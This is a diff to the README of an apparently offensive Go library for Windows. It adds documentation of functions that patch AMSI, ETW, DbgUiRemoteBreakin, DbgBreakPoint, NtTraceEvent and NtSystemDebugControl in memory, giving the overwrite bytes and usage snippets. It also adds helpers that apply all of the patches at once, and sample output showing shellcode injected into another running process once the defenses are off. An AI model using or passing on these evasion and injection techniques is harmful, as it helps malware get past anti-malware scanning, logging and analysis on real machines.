@@ -149,6 +149,12 @@ The library provides strongly-typed wrappers for common Windows APIs:
 - `NtClose` - Close handles
 - `PatchAMSI` - Disable Anti-Malware Scan Interface
 - `PatchETW` - Disable Event Tracing for Windows
+- `PatchDbgUiRemoteBreakin` - Prevent remote debugger attachment
+- `PatchDbgBreakPoint` - Prevent breakpoint interrupts
+- `PatchNtTraceEvent` - Prevent trace event logging
+- `PatchNtSystemDebugControl` - Prevent debug control operations
+- `ApplyAllPatches` - Apply all security bypass patches at once
+- `ApplyCriticalPatches` - Apply only AMSI and ETW patches
 
 ### Utility Functions
 
@@ -372,7 +378,18 @@ func main() {
 
 ## Security Bypass Features
 
-The library includes built-in security bypass capabilities that can disable common Windows security mechanisms before performing operations. These features use direct syscalls and manual function resolution to avoid detection.
+The library includes comprehensive security bypass capabilities that can disable common Windows security mechanisms before performing operations. These features use direct syscalls and manual function resolution to avoid detection.
+
+### Available Security Patches
+
+The library provides six different security bypass functions:
+
+1. **PatchAMSI** - Disables Anti-Malware Scan Interface
+2. **PatchETW** - Disables Event Tracing for Windows
+3. **PatchDbgUiRemoteBreakin** - Prevents remote debugger attachment
+4. **PatchDbgBreakPoint** - Prevents breakpoint interrupts
+5. **PatchNtTraceEvent** - Prevents trace event logging
+6. **PatchNtSystemDebugControl** - Prevents debug control operations
 
 ### AMSI Bypass
 
@@ -429,14 +446,97 @@ if err != nil {
 - **Highly Reliable**: `ntdll.dll` is always loaded, making this patch very consistent
 - **System Impact**: Only affects the current process, not system-wide
 
+### Debug Protection Bypasses
+
+#### DbgUiRemoteBreakin Bypass
+
+**DbgUiRemoteBreakin** is the Windows API function used for remote debugger attachment. Patching this function prevents external debuggers from attaching to the process.
+
+```go
+// Prevent remote debugger attachment
+err := winapi.PatchDbgUiRemoteBreakin()
+if err != nil {
+    fmt.Printf("DbgUiRemoteBreakin patch failed: %v\n", err)
+}
+```
+
+**Patch Details**: Overwrites function with single `ret` instruction (0xC3)
+
+#### DbgBreakPoint Bypass
+
+**DbgBreakPoint** is used to trigger breakpoint interrupts. Patching this function prevents breakpoint-based debugging and analysis.
+
+```go
+// Prevent breakpoint interrupts
+err := winapi.PatchDbgBreakPoint()
+if err != nil {
+    fmt.Printf("DbgBreakPoint patch failed: %v\n", err)
+}
+```
+
+**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)
+
+#### NtTraceEvent Bypass
+
+**NtTraceEvent** is used for trace event logging and debugging. Disabling this function prevents trace-based monitoring and analysis.
+
+```go
+// Prevent trace event logging
+err := winapi.PatchNtTraceEvent()
+if err != nil {
+    fmt.Printf("NtTraceEvent patch failed: %v\n", err)
+}
+```
+
+**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)
+
+#### NtSystemDebugControl Bypass
+
+**NtSystemDebugControl** provides system-level debug control operations. Patching this function prevents kernel debugging interfaces from being used.
+
+```go
+// Prevent debug control operations
+err := winapi.PatchNtSystemDebugControl()
+if err != nil {
+    fmt.Printf("NtSystemDebugControl patch failed: %v\n", err)
+}
+```
+
+**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)
+
+### Convenience Functions
+
+#### Apply All Patches
+
+For convenience, the library provides functions to apply multiple patches at once:
+
+```go
+// Apply all available security patches
+successful, failed := winapi.ApplyAllPatches()
+
+fmt.Printf("Successfully applied patches: %v\n", successful)
+for name, err := range failed {
+    fmt.Printf("Failed to apply %s: %v\n", name, err)
+}
+```
+
+#### Apply Critical Patches Only
+
+```go
+// Apply only the most important patches (AMSI and ETW)
+successful, failed := winapi.ApplyCriticalPatches()
+
+fmt.Printf("Applied %d critical patches\n", len(successful))
+```
+
 ### Integration and Usage
 
-The example application automatically applies both patches at the optimal time:
+The example application automatically applies all available patches at the optimal time:
 
-1. **Process Enumeration**: Occurs before ETW patching to avoid interference
+1. **Process Enumeration**: Occurs before patching to avoid interference
 2. **Process Selection**: User selects target process
-3. **Security Bypass**: Both AMSI and ETW are patched
-4. **Payload Injection**: Proceeds with disabled security mechanisms
+3. **Security Bypass**: All six security patches are applied automatically
+4. **Payload Injection**: Proceeds with comprehensive security bypass active
 
 #### Example Output
 
@@ -446,17 +546,22 @@ Using embedded calc shellcode (105 bytes)
 NT Status formatting enabled: Success = 0x00000000 (STATUS_SUCCESS)
 Auto-selected process: Adobe Crash Processor.exe (PID: 6904)
 Disabling security mechanisms...
-Patching AMSI...  FAILED: amsi.dll not found (not loaded)
-Patching ETW...  SUCCESS
-
+Patching NtSystemDebugControl... SUCCESS
+Patching ETW... SUCCESS
+Patching DbgUiRemoteBreakin... SUCCESS
+Patching DbgBreakPoint... SUCCESS
+Patching NtTraceEvent... SUCCESS
+Patching AMSI... FAILED: amsi.dll not found (not loaded)
+Successfully applied 5/6 security patches
 Injecting payload into Adobe Crash Processor.exe (PID: 6904)
-Allocated memory at 0x23aaf770000, status: 0x00000000 (STATUS_SUCCESS)
+Allocated memory at 0x23aaf780000, status: 0x00000000 (STATUS_SUCCESS)
 NtWriteVirtualMemory debug:
   Attempt 1 - Result status: 0x0
   Attempt 1 - Bytes written: 105
 Wrote 105 bytes, status: 0x00000000 (STATUS_SUCCESS)
 Created thread: 0x00000000 (STATUS_SUCCESS)
 Injection Successful
+
 ```
 
 #### Manual Integration
